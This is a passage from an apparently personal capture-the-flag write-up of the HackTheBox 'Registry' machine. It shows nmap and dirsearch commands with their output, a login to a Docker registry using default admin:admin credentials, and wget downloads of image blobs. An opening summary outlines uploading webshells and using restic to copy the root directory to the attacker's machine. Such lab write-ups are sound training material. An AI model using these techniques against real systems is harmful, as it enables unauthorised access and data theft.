machine</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí Enumerate the <strong><em>Bolt CMS Website</em></strong></p><p>‚Üí using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">LinPEAS</a> i found a hash that I can use for password of the website</p><p>‚Üí Looking at configuration I modify the <code>config.yml</code> and upload 2 webshells as fast as I can to gain <code>www-data</code> shell.</p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí Abuse what <code>www-data</code> allowed to run which is the restic</p><p>‚Üí create snapshot on my Kali linux machine which will be the backup server for restic</p><p>‚Üí do reverse SSH in <code>bolt user shell</code></p><p>‚Üí run the restic on <code>www-data</code> and backup the root directory that will transfer into my machine.</p><p>‚Üí get the <code>id_rsa</code> key on ssh folder, and login as root.</p><p>‚Üí Finally rooted and got the root.txt</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, I run the <strong><em>NMAP</em></strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li><li>-p-      ‚áí Scan all 65535 ports</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -p- -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> -oN nmap-Registry</span><br></pre></td></tr></table></figure><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ nmap -sV -sC -p- -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> -oN nmap-Registry</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-04-04 06:26 PST</span></span><br><span class="line">Warning: <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> <span class="function">giving up <span class="keyword">on</span> port because retransmission cap <span class="title">hit</span> (<span class="params"><span class="number">6</span></span>).</span></span><br><span class="line"><span class="function">Nmap scan report <span class="keyword">for</span> 10.10.10.159</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.25</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 65458 closed ports, 74 filtered ports</span></span><br><span class="line"><span class="function">PORT    STATE SERVICE  VERSION</span></span><br><span class="line"><span class="function">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (<span class="params">Ubuntu Linux; protocol <span class="number">2.0</span></span>)</span></span><br><span class="line"><span class="function">| ssh-hostkey: </span></span><br><span class="line"><span class="function">|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (<span class="params">RSA</span>)</span></span><br><span class="line"><span class="function">|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6<span class="title">d</span> (<span class="params">ECDSA</span>)</span></span><br><span class="line"><span class="function">|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (<span class="params">ED25519</span>)</span></span><br><span class="line"><span class="function">80/tcp  open  http     nginx 1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-server-header: nginx/1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-title: Welcome to nginx!</span></span><br><span class="line"><span class="function">443/tcp open  ssl/http nginx 1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-server-header: nginx/1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-title: Welcome to nginx!</span></span><br><span class="line"><span class="function">| ssl-cert: Subject: commonName</span>=docker.registry.htb</span><br><span class="line">| Not valid before: <span class="number">2019</span><span class="number">-05</span><span class="number">-06</span>T21:<span class="number">14</span>:<span class="number">35</span></span><br><span class="line">|_Not valid after:  <span class="number">2029</span><span class="number">-05</span><span class="number">-03</span>T21:<span class="number">14</span>:<span class="number">35</span></span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> <span class="function">IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 1218.67 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Registry took 20m19s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>22      ‚áí which basically use for SSH Connections</li><li>80       ‚áí which basically running HTTP Service</li><li>443       ‚áí which running also HTTP/S and have ssl-cert ‚Äì commonName=docker.registry.htb, I added that on my hosts file.</li></ul><hr><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>So I always visit first the HTTP service because that is a website and I got default page of a <code>Nginx Server</code>.</p><p><img src="/img/registry/registry-nginx.png" alt="HackTheBox-Registry" title="Registry NGINX"></p><p>There‚Äôs no hint for that so i try enumerate the website using <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look for website page or items which can give me a hints.</p><h3 id="Bruteforce-Web-directories"><a href="#Bruteforce-Web-directories" class="headerlink" title="Bruteforce Web directories"></a>Bruteforce Web directories</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.159/"</span> -e asd -t 20 --simple-report=registry-directories</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.9</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: 20 | Wordlist size: 6109</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-04-04_07-13-49.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.159/</span><br><span class="line"></span><br><span class="line">[07:13:49] Starting: </span><br><span class="line">[07:13:51] 400 -  182B  - /%2e%2e/google.com</span><br><span class="line">[07:13:51] 403 -  580B  - /.bash_history  </span><br><span class="line">[07:13:53] 403 -  580B  - /.ht_wsr.txt                              </span><br><span class="line">[07:13:53] 403 -  580B  - /.hta</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-dev</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-local</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-marco</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.BAK</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.bak1</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.old</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.orig</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.sample</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.txt</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.save</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_extra</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_orig</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_sc</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessBAK</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessOLD</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessOLD2</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess~</span><br><span class="line">[07:13:53] 403 -  580B  - /.htgroup</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswd-old</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswd_test</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswds</span><br><span class="line">[07:13:53] 403 -  580B  - /.htusers</span><br><span class="line">[07:14:05] 403 -  580B  - /admin/.htaccess                                       </span><br><span class="line">[07:14:13] 403 -  580B  - /administrator/.htaccess                                                          </span><br><span class="line">[07:14:17] 403 -  580B  - /app/.htaccess                                                                          </span><br><span class="line">[07:14:44] 200 -  612B  - /index.html                                                                          </span><br><span class="line">[07:14:45] 301 -  194B  - /install  -&gt;  http://10.10.10.159/install/</span><br><span class="line">[07:14:45] 200 -    1KB - /install/         </span><br><span class="line">                                                                                                                  </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry took 2m4s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="Get-install-file"><a href="#Get-install-file" class="headerlink" title="Get install file"></a>Get install file</h3><p>I only got one which is the <code>install</code> when I added it into the URL it is <code>404 Page Not found.</code></p><p><img src="/img/registry/registry-404-page.png" alt="HackTheBox-Registry" title="Registry 404"></p><p>but I manage to download the <code>install</code> using <code>wget</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ wget http:<span class="comment">//10.10.10.159/install</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">30</span>--  http:<span class="comment">//10.10.10.159/install</span></span><br><span class="line">Connecting to <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>:<span class="number">80.</span>.. connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">301</span> Moved Permanently</span><br><span class="line">Location: http:<span class="comment">//10.10.10.159/install/ [following]</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">30</span>--  http:<span class="comment">//10.10.10.159/install/</span></span><br><span class="line">Reusing existing connection to <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>:<span class="number">80.</span></span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‚Äòinstall‚Äô</span><br><span class="line"></span><br><span class="line">install                                            [ &lt;=&gt;                                                                                                ]   <span class="number">1.03</span>K  --.-KB/s    <span class="keyword">in</span> <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">31</span> (<span class="number">81.5</span> MB/s) - ‚Äòinstall‚Äô saved [<span class="number">1050</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>So I thought this was only ordinary a text file but it‚Äôs not, is a gzip file so I tried to move into a gzip and decompressed but it‚Äôs not working, and I don‚Äôt whats wrong so I move on and go the the next phase.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ file install</span><br><span class="line">install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was <span class="string">""</span>, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200</span><br></pre></td></tr></table></figure><p><img src="/img/registry/registry-install.png" alt="HackTheBox-Registry" title="Registry Install file"></p><h3 id="Explore-Docker-Registry"><a href="#Explore-Docker-Registry" class="headerlink" title="Explore Docker Registry"></a>Explore Docker Registry</h3><p>Next, i visited the <code>docker.registry.htb</code> and there will be a popup login requesting for username and password, I input <code>admin:admin</code> on that and it‚Äôs displaying a <code>JSON API</code> page.</p><p><img src="/img/registry/registry-v2.png" alt="HackTheBox-Registry" title="Registry JSON API"></p><p>and the <code>JSON API</code></p><p><img src="/img/registry/registry-response-header.png" alt="HackTheBox-Registry" title="Registry JSON API"></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><p>Next, I search for <code>Docker api registry exploitation</code> and I didn‚Äôt failed. I found this awesome <a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">article</a> which help me to get a password for SSH Key by exploring each blobs file.</p><p>So based on the method of the article, I look first at the <code>/v2/_catalog</code> and there‚Äôs a docker repository called <code>&quot;bolt-image&quot;</code> and it is basically a collection of related images.</p><h3 id="Diving-the-Docker-Repository"><a href="#Diving-the-Docker-Repository" class="headerlink" title="Diving the Docker Repository"></a>Diving the Docker Repository</h3><p><img src="/img/registry/registry-bolt-image.png" alt="HackTheBox-Registry" title="Registry bolt-image"></p><p>Next I added <code>/tags/list</code> and there was repository install called <code>latest</code></p><p><img src="/img/registry/registry-list.png" alt="HackTheBox-Registry" title="Registry Repo list"></p><p>trying to look at the <code>/manifest/v2</code></p><p><img src="/img/registry/registry-manifest.png" alt="HackTheBox-Registry" title="Registry Latest"></p><p>To download the file <code>latest</code> I added simply this in the url <code>/manifest/latest</code>.</p><p><img src="/img/registry/registry-latest.png" alt="HackTheBox-Registry" title="Registry Latest"></p><p>Open this file and we will see a lot of blobSum does have the <code>latest</code> repository in a Docker registry. Each of them will contains some info like password, files, ssh key etc.</p><p>Here are some blobs from <strong><em>latest</em></strong>.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ cat latest</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"schemaVersion"</span>: 1,</span><br><span class="line">   <span class="string">"name"</span>: <span class="string">"bolt-image"</span>,</span><br><span class="line">   <span class="string">"tag"</span>: <span class="string">"latest"</span>,</span><br><span class="line">   <span class="string">"architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">   <span class="string">"fsLayers"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"history"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"architecture\":\"amd64\",\"config\":&#123;\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":&#123;&#125;&#125;,\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":&#123;\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":&#123;&#125;&#125;,\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]&#125;,\"throwaway\":true&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke &#123; \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; &#125;;' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke &#123; \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; &#125;;' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]&#125;&#125;"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"signatures"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"header"</span>: &#123;</span><br><span class="line">            <span class="string">"jwk"</span>: &#123;</span><br><span class="line">               <span class="string">"crv"</span>: <span class="string">"P-256"</span>,</span><br><span class="line">               <span class="string">"kid"</span>: <span class="string">"VUEK:AQ5E:PKKZ:YK3J:YU44:72EU:GB57:BMI2:QMIK:DZEH:73WL:Q7BY"</span>,</span><br><span class="line">               <span class="string">"kty"</span>: <span class="string">"EC"</span>,</span><br><span class="line">               <span class="string">"x"</span>: <span class="string">"yS0jBSmoO13WXoTRXRcp_OsqPZ3-ttTv3biBxexcyCo"</span>,</span><br><span class="line">               <span class="string">"y"</span>: <span class="string">"JpwUWLV6IwW720h8XgeRpCvPoeZ_f8I82qIprZvEgm4"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"alg"</span>: <span class="string">"ES256"</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">"signature"</span>: <span class="string">"9E2loVJqpUIUj3EnEIrSKzOWaHvHKEsdAgcPX8sr152QKzWw3J7SgwLOnXPaJWegHyjYjTDnsNyEauNF8_J2SA"</span>,</span><br><span class="line">         <span class="string">"protected"</span>: <span class="string">"eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMC0wNC0wNFQwMDoyNzo1MVoifQ"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exploring-the-blobSums"><a href="#Exploring-the-blobSums" class="headerlink" title="Exploring the blobSums"></a>Exploring the blobSums</h3><p>So I need to explore each blobSum, i will download each using <strong><em>wget</em></strong> and look for interesting stuffs. so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ wget --no-check-certificate --http-user=admin --http-password=admin https:<span class="comment">//docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">08</span>:<span class="number">38</span>:<span class="number">15</span>--  https:<span class="comment">//docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br><span class="line">Resolving docker.registry.htb (docker.registry.htb)... <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span></span><br><span class="line">Connecting to docker.registry.htb (docker.registry.htb)|<span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>|:<span class="number">443.</span>.. connected.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô <span class="keyword">is</span> not trusted.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô doesn<span class="string">'t have a known issuer.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 401 Unauthorized</span></span><br><span class="line"><span class="string">Authentication selected: Basic realm="Registry"</span></span><br><span class="line"><span class="string">Reusing existing connection to docker.registry.htb:443.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 335 [application/octet-stream]</span></span><br><span class="line"><span class="string">Saving to: ‚Äòsha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b‚Äô</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sha256:302bfcb3f10c386a25a58913917257bd2fe7721 100%[===================================================================================================&gt;]     335  --.-KB/s    in 0s      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2020-04-04 08:38:16 (250 MB/s) - ‚Äòsha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b‚Äô saved [335/335]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Registry </span></span><br><span class="line"><span class="string">‚ùØ ls</span></span><br><span class="line"><span class="string">install  install.gz  latest  nmap-Registry  registry-directories  sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br></pre></td></tr></table></figure><p>Then i will moved it to into <code>.gz</code> file and decompressed it.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 